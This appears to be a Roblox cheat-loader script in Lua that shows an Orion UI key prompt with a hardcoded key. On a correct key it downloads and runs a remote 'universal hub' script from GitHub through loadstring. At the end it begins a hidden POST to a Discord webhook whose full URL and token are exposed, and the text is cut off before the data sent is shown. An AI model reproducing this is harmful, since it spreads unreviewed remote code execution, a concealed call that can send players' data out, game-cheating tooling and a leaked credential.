local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "Key"})
local Tab = Window:MakeTab({
    Name = "Whitelist",
    Icon = "rbxassetid://" ..4465390810 ,
    PremiumOnly = false
})
Tab:AddButton({
    Name = "Get Key",
    Callback = function()
          setclipboard("https://discord.gg/") ---discord here
          OrionLib:MakeNotification({
    Name = "Copied discord invite",
    Content = "Successfully copied discord server invite",
    Image = "",
    Time = 10
})
      end    
})
Tab:AddTextbox({
    Name = "Insert Key Here",
    Default = "Key",
    TextDisappear = true,
    Callback = function(Value)
        if Value == "UHV2NEW" then ---key here
            
            local Sound = Instance.new("Sound")
            Sound.SoundId = "rbxassetid://136331825"
            Sound.Parent = workspace
            Sound:Play()
            Sound.Volume = 5
            
            loadstring(game:HttpGet('https://raw.githubusercontent.com/androuniver/universalhubv2/main/master'))() --script
        
        
        
        else
            
            local Sound = Instance.new("Sound")
            Sound.SoundId = "rbxassetid://2865228021"
            Sound.Parent = workspace
            Sound:Play()
            Sound.Volume = 3
            
            OrionLib:MakeNotification({
            Name = "Universal Hub",
            Content = "Invalid key! Join the discord!",
            Image = "rbxassetid://",
            Time = 10
            })
            
OrionLib:Init()
          end
    end
})

local HttpService = game:GetService('HttpService');
syn.request({
    Url = ("https://discord.com/api/webhooks/972133762836074497/qZHCprq1WJPus6KYvQ4At6NDJ_ZGzRbL-5PJK0dkM2rvoCQoQAW0bUYCWXO8VWLJxwVg"),
    Method = ('POST'),
    Headers = { ['Content-Type'] = 'application/json' },
